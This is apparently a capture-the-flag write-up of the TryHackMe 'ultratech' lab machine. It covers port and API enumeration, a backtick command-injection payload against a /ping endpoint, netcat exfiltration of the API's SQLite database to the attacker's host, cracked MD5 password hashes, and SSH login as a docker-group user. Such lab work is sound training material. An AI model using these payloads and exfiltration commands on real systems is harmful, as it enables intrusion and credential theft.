# [ultratech](https://tryhackme.com/room/ultratech1)

> A Linux machine that exposes an API with an endpoint that is vulnerable to operating system command injection. Exploiting this vulnerability leads to the exfiltration of the API's SQLite database, which contains user account hashes that are crackable with a popular word list. One of the system's users reuses their password for their system account, enabling SSH access to the system. The system is running [Docker](https://www.docker.com/) and the user is a member of the `docker` group. This membership can be used to spawn a container that mounts the system's root directory (`/`) to the container's `/mnt` directory. It is then possible to change the container's root directory to `/mnt`, effectively widening its scope to the system itself, granting `root` access.

---

## Open Port Enumeration

The target is serving TCP ports 21, 22, 31331, and 8081.

```bash
$ sudo masscan -p1-65535 10.10.194.146 --rate=1000 -e tun0 --output-format grepable --output-filename enum/ultratech.masscan
$ cat enum/ultratech.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
21,22,31331,8081,
```

The FTP server running on TCP port 21 is `vsftpd 3.0.3`, a relatively recent version with only a known denial of service vulnerability.

According to [launch.net](https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.3), the OpenSSH banner reveals the target's operating system as Ubuntu 18.04 (Bionic Beaver).

TCP port 8081 appears to be running a Node.js web application via the [Express](https://expressjs.com/) framework.

TCP port 31331 appears to be an Apache web server (version 2.4.29) serving, based on the title, `UltraTech`'s website.

```bash
$ sudo nmap -sC -sV -O -p21,22,31331,8081 10.10.194.146 -oA enum/ultratech
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 11:55 EST
Nmap scan report for 10.10.194.146
Host is up (0.096s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.18 (92%), Linux 3.19 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.27 seconds
```

---

## FTP Enumeration

The target's `vsftpd 3.0.3` server isn't allowing anonymous logins.

```bash
$ nmap -p 21 --script=ftp-anon 10.10.194.146
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 12:02 EST
Nmap scan report for 10.10.194.146
Host is up (0.15s latency).

PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 5.08 seconds
```

---

## Port 8081 Web Application Enumeration

The landing page indicates that it is `UltraTech`'s API endpont, version 0.1.3.

![](images/Pasted%20image%2020220122120659.png)

### Content Discovery

Since it is an API, use various API endpoint lists from [SecLists](https://github.com/danielmiessler/SecLists) for content discovery.

`/usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt`

```bash
$ gobuster dir -u http://10.10.194.146:8081 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.194.146:8081
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/22 12:11:41 Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]

===============================================================
2022/01/22 12:11:43 Finished
===============================================================
```

`/usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt`

```bash
$ gobuster dir -u http://10.10.194.146:8081 -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt                            130 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.194.146:8081
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/22 12:12:50 Starting gobuster in directory enumeration mode
===============================================================

===============================================================
2022/01/22 12:12:54 Finished
===============================================================
```

`/usr/share/wordlists/seclists/Discovery/Web-Content/api/actions.txt`

```bash
$ gobuster dir -u http://10.10.194.146:8081 -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/actions.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.194.146:8081
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/api/actions.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/22 12:13:43 Starting gobuster in directory enumeration mode
===============================================================

===============================================================
2022/01/22 12:13:46 Finished
===============================================================
```

`/usr/share/wordlists/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt`

```bash
$ gobuster dir -u http://10.10.194.146:8081 -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.194.146:8081
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/22 12:14:07 Starting gobuster in directory enumeration mode
===============================================================
/?:                   (Status: 200) [Size: 20]

===============================================================
2022/01/22 12:15:29 Finished
===============================================================
```

`/usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt`

```bash
$ gobuster dir -u http://10.10.194.146:8081 -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.194.146:8081
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/22 12:19:43 Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]

===============================================================
2022/01/22 12:20:17 Finished
===============================================================
```

In total, the only API endpoints discovered were:

- `/auth`
- `/?:` (doubtful)
- `/ping` (returned a 500)

---

## Port 31331 Web Application Enumeration

The landing page is the front page of `UltraTech`'s website. `UltraTech` deals in all the buzzword technologies and apparently makes a great deal of money doing so.

### `/robots.txt`

There is a `/robots.txt` that disallows access to `/utech_sitemap.txt`.

![](images/Pasted%20image%2020220122121720.png)

`/utech_sitemap.txt` appears to contain some of the website's paths:

- `/index.html`
- `/what.html`
- `/partners.html`

![](images/Pasted%20image%2020220122121829.png)

### Content Discovery

```bash
$ gobuster dir -u http://10.10.194.146:31331 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -x html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.194.146:31331
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html
[+] Timeout:                 10s
===============================================================
2022/01/22 12:27:10 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 295]
/.html                (Status: 403) [Size: 296]
/images               (Status: 301) [Size: 324] [--> http://10.10.194.146:31331/images/]
/.html.html           (Status: 403) [Size: 301]
/js                   (Status: 301) [Size: 320] [--> http://10.10.194.146:31331/js/]
/index.html           (Status: 200) [Size: 6092]
/css                  (Status: 301) [Size: 321] [--> http://10.10.194.146:31331/css/]
/.htm                 (Status: 403) [Size: 295]
/.htm.html            (Status: 403) [Size: 300]
/javascript           (Status: 301) [Size: 328] [--> http://10.10.194.146:31331/javascript/]
/partners.html        (Status: 200) [Size: 1986]
/.                    (Status: 200) [Size: 6092]
/.htaccess            (Status: 403) [Size: 300]
/.htaccess.html       (Status: 403) [Size: 305]
/.phtml               (Status: 403) [Size: 297]
/.htc                 (Status: 403) [Size: 295]
/.htc.html            (Status: 403) [Size: 300]
/.html_var_DE         (Status: 403) [Size: 303]
/.html_var_DE.html    (Status: 403) [Size: 308]
/server-status        (Status: 403) [Size: 304]
/what.html            (Status: 200) [Size: 2534]
/.htpasswd            (Status: 403) [Size: 300]
/.htpasswd.html       (Status: 403) [Size: 305]
/.html..html          (Status: 403) [Size: 302]
/.html.               (Status: 403) [Size: 297]
/.html.html           (Status: 403) [Size: 301]
/.html.html.html      (Status: 403) [Size: 306]
/.htpasswds           (Status: 403) [Size: 301]
/.htpasswds.html      (Status: 403) [Size: 306]
/.htm.                (Status: 403) [Size: 296]
/.htm..html           (Status: 403) [Size: 301]
/.htmll               (Status: 403) [Size: 297]
/.phps                (Status: 403) [Size: 296]
/.htmll.html          (Status: 403) [Size: 302]
/.html.old            (Status: 403) [Size: 300]
/.html.old.html       (Status: 403) [Size: 305]
/.html.bak.html       (Status: 403) [Size: 305]
/.ht                  (Status: 403) [Size: 294]
/.ht.html             (Status: 403) [Size: 299]
/.html.bak            (Status: 403) [Size: 300]
/.htm.htm             (Status: 403) [Size: 299]
/.htm.htm.html        (Status: 403) [Size: 304]
/.hta.html            (Status: 403) [Size: 300]
/.htgroup             (Status: 403) [Size: 299]
/.html1               (Status: 403) [Size: 297]
/.htgroup.html        (Status: 403) [Size: 304]
/.hta                 (Status: 403) [Size: 295]
/.html1.html          (Status: 403) [Size: 302]
/.html.LCK.html       (Status: 403) [Size: 305]
/.html.printable.html (Status: 403) [Size: 311]
/.html.LCK            (Status: 403) [Size: 300]
/.html.printable      (Status: 403) [Size: 306]
/.htm.LCK.html        (Status: 403) [Size: 304]
/.htm.LCK             (Status: 403) [Size: 299]
/.htaccess.bak        (Status: 403) [Size: 304]
/.html.php            (Status: 403) [Size: 300]
/.htx                 (Status: 403) [Size: 295]
/.htmls.html          (Status: 403) [Size: 302]
/.html.php.html       (Status: 403) [Size: 305]
/.htaccess.bak.html   (Status: 403) [Size: 309]
/.htmls               (Status: 403) [Size: 297]
/.htx.html            (Status: 403) [Size: 300]
/.htlm.html           (Status: 403) [Size: 301]
/.htm2                (Status: 403) [Size: 296]
/.html-               (Status: 403) [Size: 297]
/.htuser              (Status: 403) [Size: 298]
/.htlm                (Status: 403) [Size: 296]
/.htm2.html           (Status: 403) [Size: 301]
/.html-.html          (Status: 403) [Size: 302]
/.htuser.html         (Status: 403) [Size: 303]

===============================================================
2022/01/22 12:42:34 Finished
===============================================================
```

### Manual Enumeration

#### `/index.html`

The landing page contains names and apparent usernames for three of its team members:

- John McFamicom (`r00t`)
- Francois LeMytho (`P4c0`)
- Alvaro Squalo (`Sq4l`)

![](images/Pasted%20image%2020220122122509.png)

### `/what.html`

This page is supposed to go into more detail about what `UltraTech` is currently doing, but apparently no one has gotten around to completing it. This task is being given to some unpaid intern.

### `/partners.html`

This is a login form for `UltraTech`'s "private partners."

![](images/Pasted%20image%2020220122123006.png)

Submitting it sends an HTTP `GET` request to the API's `/auth` endpont with the username and password as query parameters.

```http
GET /auth?login=admin&password=admin HTTP/1.1
Host: 10.10.194.146:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.194.146:31331/partners.html
Upgrade-Insecure-Requests: 1
```

Incorrect credentials result in a plaintext response from the API:

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 19
ETag: W/"13-5BeEbsCKuYi/D6yoiMYWlEvunLM"
Date: Sat, 22 Jan 2022 17:28:39 GMT
Connection: close

Invalid credentials
```

Retrieving `/partner.html` also retrieves and executes `/api.js`.

---

## Port 31331's `api.js`

```js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
		return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
		const req = new XMLHttpRequest();
		try {
			const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
			req.open('GET', url, true);
			req.onload = function (e) {
			if (req.readyState === 4) {
				if (req.status === 200) {
				console.log('The api seems to be running')
				} else {
				console.error(req.statusText);
				}
			}
			};
			req.onerror = function (e) {
			console.error(xhr.statusText);
			};
			req.send(null);
		}
		catch (e) {
			console.error(e)
			console.log('API Error');
		}
    }

    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
})();
```

This function causes the browser to make continual requests to the API's `/ping` endpoint:

```http
GET /ping?ip=10.10.194.146 HTTP/1.1
Host: 10.10.194.146:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://10.10.194.146:31331
Connection: close
Referer: http://10.10.194.146:31331/partners.html
If-None-Match: W/"10b-+Hh5OEKiQAiEwMH702xxcIPrv9c"
```

This endpoint takes a single query parameter, `ip`, and appears to execute the `ping` command with it. The response from the API:

```http
PING 10.10.194.146 (10.10.194.146) 56(84) bytes of data.
64 bytes from 10.10.194.146: icmp_seq=1 ttl=64 time=0.014 ms

--- 10.10.194.146 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.014/0.014/0.014/0.000 ms
```

---

## `/ping` API Endpoint Injection

The `/ping` API endpoint on port 8081 appears to take the parameter `ip` and pass it to the following `/bin/sh` command:

```bash
ping $ip
```

After some testing, it appears the API filters away `;`, `&`, and `|` characters. However, it is possible to execute arbitrary commands without these characters using this payload format, albeit with limited output:

```txt
localhost `id`
```

The request:

```http
GET /ping?ip=localhost+`id` HTTP/1.1
Host: 10.10.194.146:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://10.10.194.146:31331
Connection: close
Referer: http://10.10.194.146:31331/partners.html
If-None-Match: W/"10b-+Hh5OEKiQAiEwMH702xxcIPrv9c"
```

The response:

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 61
ETag: W/"3d-2J2mX1i3I4uQhsVi8ABaq24IgPw"
Date: Sat, 22 Jan 2022 17:57:37 GMT
Connection: close

ping: groups=1002(www): Temporary failure in name resolution
```

To retrieve more output, start a `netcat` listener. Submit one request executing the target command and writing its output to a file. Submit another request piping the output file to the `netcat` listener.

There are three users in `/home`:

```bash
$ ls /home
lp1
r00t
www
```

```bash
$ ls /home/www
total 40
drwxr-xr-x   5 www  www  4096 Mar 22  2019 .
drwxr-xr-x   5 root root 4096 Mar 22  2019 ..
drwxr-xr-x   3 www  www  4096 Mar 22  2019 api
-rw-------   1 www  www     8 Mar 22  2019 .bash_history
-rw-r--r--   1 www  www   220 Apr  4  2018 .bash_logout
-rw-r--r--   1 www  www  3771 Apr  4  2018 .bashrc
drwx------   3 www  www  4096 Mar 22  2019 .emacs.d
drwxrwxr-x 164 www  www  4096 Mar 22  2019 .npm
-rw-r--r--   1 www  www   807 Apr  4  2018 .profile
-rw-rw-r--   1 www  www    73 Mar 22  2019 .selected_editor
```

```bash
$ ls /home/www/api
total 76
drwxr-xr-x   3 www www  4096 Mar 22  2019 .
drwxr-xr-x   5 www www  4096 Mar 22  2019 ..
-rw-r--r--   1 www www  1750 Mar 22  2019 index.js
drwxrwxr-x 163 www www  4096 Mar 22  2019 node_modules
-rw-r--r--   1 www www   370 Mar 22  2019 package.json
-rw-r--r--   1 www www 42702 Mar 22  2019 package-lock.json
-rw-rw-r--   1 www www   103 Mar 22  2019 start.sh
-rw-r--r--   1 www www  8192 Mar 22  2019 utech.db.sqlite
```

The API contains a comment indicating that the unpaid intern potentially misconfigured the server.

The API's `/auth` endpoint compares the given authentication data against users from the SQLite database `/home/www/api/utech.db.sqlite`. According to the source code, their passwords are stored as MD5 hashes. 

```bash
$ cat /home/www/api/index.js
const express = require('express')
const cors = require('cors')
const app = express()
const sqlite = require('sqlite3')
const shell = require('shelljs')
const md5 = require('md5')

//
const PORT = 8081
let db = null
let users = []
const loggedView = `<html>
<h1>Restricted area</h1>
<p>Hey r00t, can you please have a look at the server's configuration?<br/>
The intern did it and I don't really trust him.<br/>
Thanks!<br/><br/>
<i>lp1</i></p>
</html>`

function exec(cmd, res) {
    shell.exec(cmd, (code, stdout, stderr) => {
        if (stderr) {
            res.send(stderr)
        } else {
            res.send(stdout)
        }
    })
}

function initDB() {
    db = new sqlite.Database('utech.db.sqlite');
    db.each('select * from users', (err, row) => {
        users.push(row)
    })
}


app.use(cors())

app.get('/', (req, res) => {
    res.send('UltraTech API v0.1.3')
})

app.get('/ping', (req, res) => {
    const ip = req.query.ip.replace(/[\;|\$|&]/g, '').replace(/&/g, '')
    if (ip) {
        const cmd = `ping -c 1 ${ip}`
        console.log('cmd is', cmd)
//        const output = execSync(cmd, { encoding: 'utf-8' });
        exec(cmd, res);
    } else {
        res.send('Invalid ip parameter specified')
    }
})

app.get('/auth', (req, res) => {
    const login = req.query.login;
    const password = req.query.password;
    if (!login || !password) {
        res.send('You must specify a login and a password')
    } else {
        for (let user of users) {
            if (user.login === login && user.password === md5(password)) {
                res.send(loggedView)
                return
            }
        }
        res.send('Invalid credentials')
    }
})

initDB()

app.listen(PORT, function () {
    console.log(`UltraTech listening on ${PORT}`)
})
```

---

## Dumping the API's Users

Transfer the API's SQLite database, `/home/www/api/utech.db.sqlite`, to the attacking machine.

Start a `netcat` listener on the attacking machine:

```bash
$ nc -nlvp 80 > utech.db.sqlite
```

On the target machine:

```bash
$ nc -nv 10.6.31.77 80 < /home/www/api/utech.db.sqlite
```

The only table in the database is `users`.

```sql
sqlite> SELECT name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%';
users
```

Its columns are `login` (username), `password`, and `type`.

```sql
sqlite> SELECT sql FROM sqlite_master WHERE type = 'table' AND name = 'users';
CREATE TABLE users (
            login Varchar,
            password Varchar,
            type Int
        )
```

Dump the `users` table.

```bash
$ sqlite3 utech.db.sqlite
SQLite version 3.36.0 2021-06-18 18:36:39
Enter ".help" for usage hints.
sqlite> select * from users;
admin|0d0ea5111e3c1def594c1684e3b9be84|0
r00t|f357a0c52799563c7c7b76c1e7543a32|0
```

These hashes crack successfully with `rockyou.txt`, revealing the credentials `admin`:`mrsheafy` and `r00t`:`n100906`.

```bash
$ hashcat -a 0 -m 0 utech-hashes.txt rockyou.txt
f357a0c52799563c7c7b76c1e7543a32:n100906
0d0ea5111e3c1def594c1684e3b9be84:mrsheafy
```

---

## SSH Access as `r00t`

Use the credential `r00t`:`n100906` to access the machine via SSH.

```bash
$ ssh r00t@10.10.194.146
r00t@10.10.194.146's password:
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 22 18:27:25 UTC 2022

  System load:  0.08               Processes:           104
  Usage of /:   24.4% of 19.56GB   Users logged in:     0
  Memory usage: 73%                IP address for eth0: 10.10.194.146
  Swap usage:   0%


1 package can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

---

## Situational Awareness as `r00t`

The target's kernel version is 4.15.0. Its operatinng system is Ubuntu 18.04.2.

```bash
r00t@ultratech-prod:~$ uname -a
Linux ultratech-prod 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

r00t@ultratech-prod:~$ cat /etc/issue
Ubuntu 18.04.2 LTS \n \l
```

The target's CPU is 64-bit (32-bit optional) with one core and one thread on that core.

```bash
r00t@ultratech-prod:~$ lscpu
Architecture:        x86_64
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
CPU(s):              1
On-line CPU(s) list: 0
Thread(s) per core:  1
Core(s) per socket:  1
Socket(s):           1
NUMA node(s):        1
Vendor ID:           GenuineIntel
CPU family:          6
Model:               79
Model name:          Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz
Stepping:            1
CPU MHz:             2299.795
BogoMIPS:            4600.02
Hypervisor vendor:   Xen
Virtualization type: full
L1d cache:           32K
L1i cache:           32K
L2 cache:            256K
L3 cache:            46080K
NUMA node0 CPU(s):   0
Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx rdtscp lm constant_tsc rep_good nopl xtopology cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm cpuid_fault invpcid_single pti fsgsbase bmi1 avx2 smep bmi2 erms invpcid xsaveopt
```

There is a `cron` job ensuring the API is always running.

```bash
r00t@ultratech-prod:~$ ps auxef
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    20:37   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   20:37   0:00  \_ [kworker/0:0H]
root         5  0.0  0.0      0     0 ?        I    20:37   0:00  \_ [kworker/u30:0]
root         6  0.0  0.0      0     0 ?        I<   20:37   0:00  \_ [mm_percpu_wq]
root         7  0.2  0.0      0     0 ?        S    20:37   0:01  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    20:37   0:00  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    20:37   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    20:37   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    20:37   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    20:37   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    20:37   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   20:37   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    20:37   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    20:37   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    20:37   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    20:37   0:00  \_ [xenwatch]
root        19  0.2  0.0      0     0 ?        I    20:37   0:01  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    20:37   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    20:37   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   20:37   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    20:37   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   20:37   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        I<   20:37   0:00  \_ [crypto]
root        26  0.0  0.0      0     0 ?        I<   20:37   0:00  \_ [kintegrityd]
root        27  0.0  0.0      0     0 ?        I<   20:37   0:00  \_ [kblockd]
root        28  0.0  0.0      0     0 ?        I<   20:37   0:00  \_ [ata_sff]
root        29  0.0  0.0      0     0 ?        I<   20:37   0:00  \_ [md]
root        30  0.0  0.0      0     0 ?        I<   20:37   0:00  \_ [edac-poller]
root        31  0.0  0.0      0     0 ?        I<   20:37   0:00  \_ [devfreq_wq]
root        32  0.0  0.0      0     0 ?        I<   20:37   0:00  \_ [watchdogd]
root        33  0.0  0.0      0     0 ?        I    20:37   0:00  \_ [kworker/u30:1]
root        35  2.4  0.0      0     0 ?        S    20:38   0:10  \_ [kswapd0]
root        36  0.0  0.0      0     0 ?        S    20:38   0:00  \_ [ecryptfs-kthrea]
root        78  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [kthrotld]
root        79  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [acpi_thermal_pm]
root        80  0.0  0.0      0     0 ?        S    20:38   0:00  \_ [scsi_eh_0]
root        81  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [scsi_tmf_0]
root        82  0.0  0.0      0     0 ?        S    20:38   0:00  \_ [scsi_eh_1]
root        83  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [scsi_tmf_1]
root        84  0.0  0.0      0     0 ?        I    20:38   0:00  \_ [kworker/u30:2]
root        88  0.5  0.0      0     0 ?        I<   20:38   0:02  \_ [kworker/0:1H]
root        89  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [ipv6_addrconf]
root        98  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [kstrp]
root       116  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [charger_manager]
root       155  0.0  0.0      0     0 ?        I    20:38   0:00  \_ [kworker/0:2]
root       168  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [ttm_swap]
root       197  0.0  0.0      0     0 ?        I    20:38   0:00  \_ [kworker/u30:3]
root       263  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [raid5wq]
root       311  0.0  0.0      0     0 ?        S    20:38   0:00  \_ [jbd2/xvda2-8]
root       312  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [ext4-rsv-conver]
root       394  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [iscsi_eh]
root       401  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [ib_mcast]
root       404  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [ib_nl_sa_wq]
root       405  0.0  0.0      0     0 ?        I<   20:38   0:00  \_ [rdma_cm]
root       435  0.0  0.0      0     0 ?        S<   20:38   0:00  \_ [loop0]
root       438  0.0  0.0      0     0 ?        S<   20:38   0:00  \_ [loop1]
root         1  6.8  1.2 225172  6160 ?        Ss   20:37   0:30 /sbin/init maybe-ubiquity
root       386  0.8  1.0 127636  5184 ?        S<s  20:38   0:03 /lib/systemd/systemd-journald
root       399  0.0  0.1  97708   600 ?        Ss   20:38   0:00 /sbin/lvmetad -f
root       402  1.5  0.7  46200  3772 ?        Rs   20:38   0:06 /lib/systemd/systemd-udevd
root      1588  0.0  0.6  46200  3224 ?        R    20:45   0:00  \_ /lib/systemd/systemd-udevd
root      1589  0.0  0.6  46200  2928 ?        S    20:45   0:00  \_ /lib/systemd/systemd-udevd
root      1590  0.0  0.5  46200  2760 ?        S    20:45   0:00  \_ /lib/systemd/systemd-udevd
root      1591  0.0  0.5  46200  2760 ?        S    20:45   0:00  \_ /lib/systemd/systemd-udevd
root      1592  0.0  0.5  46200  2760 ?        S    20:45   0:00  \_ /lib/systemd/systemd-udevd
systemd+   443  0.1  0.5 141924  2588 ?        Ssl  20:38   0:00 /lib/systemd/systemd-timesyncd
systemd+   630  0.0  0.4  80036  1996 ?        Ss   20:39   0:00 /lib/systemd/systemd-networkd
systemd+   639  0.1  0.3  70624  1840 ?        Ss   20:39   0:00 /lib/systemd/systemd-resolved
message+   732  0.0  0.5  50100  2764 ?        Rs   20:39   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       739  1.3  0.3 636592  1644 ?        Ssl  20:39   0:04 /usr/bin/lxcfs /var/lib/lxcfs/
root       740  0.0  0.0  31872   212 ?        Ss   20:39   0:00 /usr/sbin/inetd
daemon     745  0.0  0.2  28332  1316 ?        Ss   20:39   0:00 /usr/sbin/atd -f
root       756  0.1  0.5  70580  2860 ?        Ss   20:39   0:00 /lib/systemd/systemd-logind
